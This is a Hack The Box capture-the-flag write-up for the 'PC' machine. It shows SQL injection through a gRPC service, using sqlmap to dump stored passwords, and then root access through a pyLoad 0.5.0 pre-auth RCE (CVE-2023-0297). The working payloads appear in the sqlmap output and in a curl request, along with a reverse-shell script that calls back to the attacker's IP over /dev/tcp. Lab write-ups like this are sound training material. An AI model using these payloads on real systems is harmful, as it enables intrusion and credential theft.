+++
title = "HTB Writeup - PC (Easy)"
author = "CyberSpider"
description = "Writeup of PC from Hack The Box."
tags = ['htb', 'easy', 'linux', 'RCE', 'gRPC']
lastmod = 2023-09-04
draft = false
+++

The `PC` machine is an easy linux box.



## Nmap Scan

I do a `nmap scan`:
```sh
┌──(kali㉿kali)-[~]
└─$ nmap -p- -sC -sV --min-rate 5000 10.10.11.214 -Pn           
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-02 16:48 EDT
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 5.33% done; ETC: 16:49 (0:00:53 remaining)
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 13.93% done; ETC: 16:49 (0:00:43 remaining)
Nmap scan report for 10.10.11.214
Host is up (0.12s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91:bf:44:ed:ea:1e:32:24:30:1f:53:2c:ea:71:e5:ef (RSA)
|   256 84:86:a6:e2:04:ab:df:f7:1d:45:6c:cf:39:58:09:de (ECDSA)
|_  256 1a:a8:95:72:51:5e:8e:3c:f1:80:f5:42:fd:0a:28:1c (ED25519)
50051/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port50051-TCP:V=7.94%I=7%D=9/2%Time=64F39FD0%P=x86_64-pc-linux-gnu%r(NU
SF:LL,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x06
SF:\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(GenericL
SF:ines,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x
SF:06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(GetReq
SF:uest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x
SF:06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(HTTPOp
SF:tions,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RTSPR
SF:equest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0
SF:\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RPCC
SF:heck,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x
SF:06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(DNSVer
SF:sionBindReqTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\x
SF:ff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0"
SF:)%r(DNSStatusRequestTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\
SF:x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0
SF:\0\?\0\0")%r(Help,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\
SF:?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0
SF:\0")%r(SSLSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05
SF:\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\
SF:?\0\0")%r(TerminalServerCookie,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff
SF:\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\
SF:0\0\0\0\0\?\0\0")%r(TLSSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\
SF:xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08
SF:\0\0\0\0\0\0\?\0\0")%r(Kerberos,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf
SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
SF:\0\0\0\0\0\?\0\0")%r(SMBProgNeg,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf
SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
SF:\0\0\0\0\0\?\0\0")%r(X11Probe,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\
SF:xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0
SF:\0\0\0\0\?\0\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.86 seconds
```

I do any research and I discover that the 50051 port is to `gRPC`

## gRPC

I find this tool `https://github.com/fullstorydev/grpcui` to interact with this service, I download it form this site `https://github.com/fullstorydev/grpcui/releases/tag/v1.3.1` , and I unzip the file:

```sh
┌──(kali㉿kali)-[~/Downloads]
└─$ tar -xvf grpcui_1.3.1_linux_x86_64.tar.gz
LICENSE
grpcui
┌──(kali㉿kali)-[~/Downloads]
└─$ ls
  grpcui    grpcui_1.3.1_linux_x86_64.tar.gz

┌──(kali㉿kali)-[~/Downloads]
└─$ cd /home/kali                               

┌──(kali㉿kali)-[~]
└─$ cp ~/Downloads/grpcui .                            

┌──(kali㉿kali)-[~]
└─$ ls
 grpcui  
```

I connect to the service:
```sh
┌──(kali㉿kali)-[~]
└─$ ./grpcui -plaintext 10.10.11.214:50051
gRPC Web UI available at http://127.0.0.1:33231/
Missing chrome or resource URL: resource://gre/modules/UpdateListener.jsm
Missing chrome or resource URL: resource://gre/modules/UpdateListener.sys.mjs
```

I do the `Register User`:
- Request:
```http
POST /invoke/SimpleApp.RegisterUser HTTP/1.1
Host: 127.0.0.1:37013
Content-Length: 65
sec-ch-ua: 
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
Content-Type: application/json
Accept: */*
X-Requested-With: XMLHttpRequest
x-grpcui-csrf-token: lE7ta9mOmKAoi2wdiRyRk2bDv2txFi_GzZrNA0zCuHU
sec-ch-ua-platform: ""
Origin: http://127.0.0.1:37013
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:37013/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _grpcui_csrf_token=lE7ta9mOmKAoi2wdiRyRk2bDv2txFi_GzZrNA0zCuHU
Connection: close

{"metadata":[],"data":[{"username":"cyber","password":"spider"}]}
```

I do the `Login User`:
- Request:
```http
POST /invoke/SimpleApp.LoginUser HTTP/1.1
Host: 127.0.0.1:37013
Content-Length: 65
sec-ch-ua: 
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
Content-Type: application/json
Accept: */*
X-Requested-With: XMLHttpRequest
x-grpcui-csrf-token: lE7ta9mOmKAoi2wdiRyRk2bDv2txFi_GzZrNA0zCuHU
sec-ch-ua-platform: ""
Origin: http://127.0.0.1:37013
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:37013/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _grpcui_csrf_token=lE7ta9mOmKAoi2wdiRyRk2bDv2txFi_GzZrNA0zCuHU
Connection: close

{"metadata":[],"data":[{"username":"cyber","password":"spider"}]}
```

- Response:
```http
HTTP/1.1 200 OK
Content-Type: application/json
Date: Sun, 03 Sep 2023 19:18:23 GMT
Content-Length: 587
Connection: close

{
  "headers": [
    {
      "name": "content-type",
      "value": "application/grpc"
    },
    {
      "name": "grpc-accept-encoding",
      "value": "identity, deflate, gzip"
    }
  ],
  "error": null,
  "responses": [
    {
      "message": {
        "message": "Your id is 517."
      },
      "isError": false
    }
  ],
  "requests": {
    "total": 1,
    "sent": 1
  },
  "trailers": [
    {
      "name": "token",
      "value": "b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiY3liZXIiLCJleHAiOjE2OTM3Nzg3MDV9.Y7QoF88uPDaFgX8vZRxFUfChyFOyP9g7t6sAzxDOrMY'"
    }
  ]
}
```
I see the `id` and the `token`

## SQLi

I go in `Method name` ,  I select `getinfo`, I insert id and token and click `Invoke`:
- Request:
```http
POST /invoke/SimpleApp.getInfo HTTP/1.1
Host: 127.0.0.1:37013
Content-Length: 191
sec-ch-ua: 
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
Content-Type: application/json
Accept: */*
X-Requested-With: XMLHttpRequest
x-grpcui-csrf-token: lE7ta9mOmKAoi2wdiRyRk2bDv2txFi_GzZrNA0zCuHU
sec-ch-ua-platform: ""
Origin: http://127.0.0.1:37013
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:37013/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _grpcui_csrf_token=lE7ta9mOmKAoi2wdiRyRk2bDv2txFi_GzZrNA0zCuHU
Connection: close

{"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiY3liZXIiLCJleHAiOjE2OTM3Nzg3MDV9.Y7QoF88uPDaFgX8vZRxFUfChyFOyP9g7t6sAzxDOrMY"}],"data":[{"id":"517"}]}
```

- Response:
```http
HTTP/1.1 200 OK
Content-Type: application/json
Date: Sun, 03 Sep 2023 19:31:06 GMT
Content-Length: 401
Connection: close


{
  "headers": [
    {
      "name": "content-type",
      "value": "application/grpc"
    },
    {
      "name": "grpc-accept-encoding",
      "value": "identity, deflate, gzip"
    }
  ],
  "error": null,
  "responses": [
    {
      "message": {
        "message": "Will update soon."
      },
      "isError": false
    }
  ],
  "requests": {
    "total": 1,
    "sent": 1
  },
  "trailers": []
}

```

I add in the id field an `apex`:
- Request:
```http
POST /invoke/SimpleApp.getInfo HTTP/1.1
Host: 127.0.0.1:37013
Content-Length: 191
sec-ch-ua: 
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
Content-Type: application/json
Accept: */*
X-Requested-With: XMLHttpRequest
x-grpcui-csrf-token: lE7ta9mOmKAoi2wdiRyRk2bDv2txFi_GzZrNA0zCuHU
sec-ch-ua-platform: ""
Origin: http://127.0.0.1:37013
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:37013/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: _grpcui_csrf_token=lE7ta9mOmKAoi2wdiRyRk2bDv2txFi_GzZrNA0zCuHU
Connection: close

{"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiY3liZXIiLCJleHAiOjE2OTM3Nzg3MDV9.Y7QoF88uPDaFgX8vZRxFUfChyFOyP9g7t6sAzxDOrMY"}],"data":[{"id":"517'"}]}
```

- Response:
```http
HTTP/1.1 200 OK
Content-Type: application/json
Date: Sun, 03 Sep 2023 19:34:51 GMT
Content-Length: 364
Connection: close

{
  "headers": [],
  "error": {
    "code": 2,
    "name": "Unknown",
    "message": "Unexpected \u003cclass 'TypeError'\u003e: bad argument type for built-in operation",
    "details": []
  },
  "responses": null,
  "requests": {
    "total": 1,
    "sent": 1
  },
  "trailers": [
    {
      "name": "content-type",
      "value": "application/grpc"
    }
  ]
}
```

It can be vulnerable to `SQL injection`, so I save the request and pass it to `sqlmap`:
```sh
┌──(kali㉿kali)-[~]
└─$ sqlmap -r req.txt -p id --batch --dump
        ___
       __H__                                                                                                                                                                                                                             
 ___ ___[,]_____ ___ ___  {1.7.6#stable}                                                                                                                                                                                                 
|_ -| . [)]     | .'| . |                                                                                                                                                                                                                
|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                                                                
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                             

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:53:33 /2023-09-03/

[15:53:33] [INFO] parsing HTTP request from 'req.txt'
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[15:53:34] [INFO] resuming back-end DBMS 'sqlite' 
[15:53:34] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON id ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiY3liZXIiLCJleHAiOjE2OTM3Nzg3MDV9.Y7QoF88uPDaFgX8vZRxFUfChyFOyP9g7t6sAzxDOrMY"}],"data":[{"id":"517 AND 7623=7623"}]}

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiY3liZXIiLCJleHAiOjE2OTM3Nzg3MDV9.Y7QoF88uPDaFgX8vZRxFUfChyFOyP9g7t6sAzxDOrMY"}],"data":[{"id":"517 AND 4771=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))"}]}

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiY3liZXIiLCJleHAiOjE2OTM3Nzg3MDV9.Y7QoF88uPDaFgX8vZRxFUfChyFOyP9g7t6sAzxDOrMY"}],"data":[{"id":"-5023 UNION ALL SELECT CHAR(113,120,112,113,113)||CHAR(74,66,85,121,69,68,98,97,89,66,87,105,67,86,70,109,77,77,105,69,65,109,80,99,100,101,81,118,71,76,81,77,103,66,107,115,104,103,74,103)||CHAR(113,112,98,107,113)-- WsBU"}]}
---
[15:53:34] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[15:53:34] [INFO] fetching tables for database: 'SQLite_masterdb'
[15:53:34] [INFO] fetching columns for table 'accounts' 
[15:53:34] [INFO] fetching entries for table 'accounts'
Database: <current>
Table: accounts
[3 entries]
+------------------------+----------+
| password               | username |
+------------------------+----------+
| admin                  | admin    |
| HereIsYourPassWord1431 | sau      |
| anon                   | anon3    |
+------------------------+----------+

[15:53:34] [INFO] table 'SQLite_masterdb.accounts' dumped to CSV file '/home/kali/.local/share/sqlmap/output/127.0.0.1/dump/SQLite_masterdb/accounts.csv'
[15:53:34] [INFO] fetching columns for table 'messages' 
[15:53:35] [INFO] fetching entries for table 'messages'
Database: <current>
Table: messages
[2 entries]
+-----+----------------------------------------------+----------+
| id  | message                                      | username |
+-----+----------------------------------------------+----------+
| 1   | The admin is working hard to fix the issues. | admin    |
| 749 | Will update soon.                            | anon3    |
+-----+----------------------------------------------+----------+

[15:53:35] [INFO] table 'SQLite_masterdb.messages' dumped to CSV file '/home/kali/.local/share/sqlmap/output/127.0.0.1/dump/SQLite_masterdb/messages.csv'
[15:53:35] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/127.0.0.1'
```

I have find the `credentials`:
```
sau:HereIsYourPassWord1431
```

I login to ssh like sau and I find the `user flag`:
```
┌──(kali㉿kali)-[~]
└─$ ssh sau@10.10.11.214                  
The authenticity of host '10.10.11.214 (10.10.11.214)' can't be established.
ED25519 key fingerprint is SHA256:63yHg6metJY5dfzHxDVLi4Zpucku6SuRziVLenmSmZg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.214' (ED25519) to the list of known hosts.
sau@10.10.11.214's password: 
Last login: Mon May 15 09:00:44 2023 from 10.10.14.19
sau@pc:~$ whoami
sau
sau@pc:~$ ls -all
total 28
drwxr-xr-x 3 sau  sau  4096 Jan 11  2023 .
drwxr-xr-x 3 root root 4096 Jan 11  2023 ..
lrwxrwxrwx 1 root root    9 Jan 11  2023 .bash_history -> /dev/null
-rw-r--r-- 1 sau  sau   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 sau  sau  3771 Feb 25  2020 .bashrc
drwx------ 2 sau  sau  4096 Jan 11  2023 .cache
-rw-r--r-- 1 sau  sau   807 Feb 25  2020 .profile
lrwxrwxrwx 1 root root    9 Jan 11  2023 .viminfo -> /dev/null
-rw-r----- 1 root sau    33 Sep  3 18:43 user.txt
sau@pc:~$ cat user.txt
1cc09011589ad540cec5c2ed6f6d134f
sau@pc:~$ 
```

## Privilege Escalation

I see a strange port open(`8000`):
```sh
sau@pc:/var$ netstat -antp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0    360 10.10.11.214:22         10.10.14.148:34178      ESTABLISHED -                   
tcp6       0      0 :::50051                :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 10.10.11.214:50051      10.10.14.148:55410      ESTABLISHED -  
```

I do the `Port Forwarding`:

```sh
┌──(kali㉿kali)-[~]
└─$ ssh -L 1234:localhost:8000 sau@10.10.11.214       
sau@10.10.11.214's password: 
Last login: Sun Sep  3 19:56:06 2023 from 10.10.14.148
```

I do a `nmap` scan:

```sh
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -A 127.0.0.1 -p 1234
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-03 16:26 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00020s latency).

PORT     STATE SERVICE VERSION
1234/tcp open  http    CherryPy wsgiserver
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Cheroot/8.6.0
| http-title: Login - pyLoad 
|_Requested resource was /login?next=http%3A%2F%2Flocalhost%3A1234%2F

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.77 seconds
```

I open `firefox`:

```sh
┌──(kali㉿kali)-[~]
└─$ firefox 127.0.0.1:1234
```

I discover the `version` of pyload:

```sh
sau@pc:/dev/shm$ pyload --version
pyLoad 0.5.0
sau@pc:/dev/shm$ 
```

This version it has a vulnerability, I see the PoC `https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad/blob/main/README.md`

I make a `reverse shell` on Target Machine:

```sh
sau@pc:/dev/shm$ nano rev.sh
sau@pc:/dev/shm$ cat rev.sh
sh -i >& /dev/tcp/10.10.14.148/4444 0>&1
sau@pc:/dev/shm$ chmod a=+w+r+x rev.sh
```

I open a listening port:

```sh
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
```

I exploit the `Remote Code Execution`:

```sh
┌──(kali㉿kali)-[~]
└─$ curl -i -s -k -X $'POST' --data-binary $'jk=pyimport%20os;os.system(\"bash%20/dev/shm/rev.sh\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
 $'http://127.0.0.1:1234/flash/addcrypted2'
```

I get the `root flag`:

```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.148] from (UNKNOWN) [10.10.11.214] 35026
sh: 0: can't access tty; job control turned off
# whoami
root
# cat /root/root.txt
ff3be728b13b976379bd857f720be234
```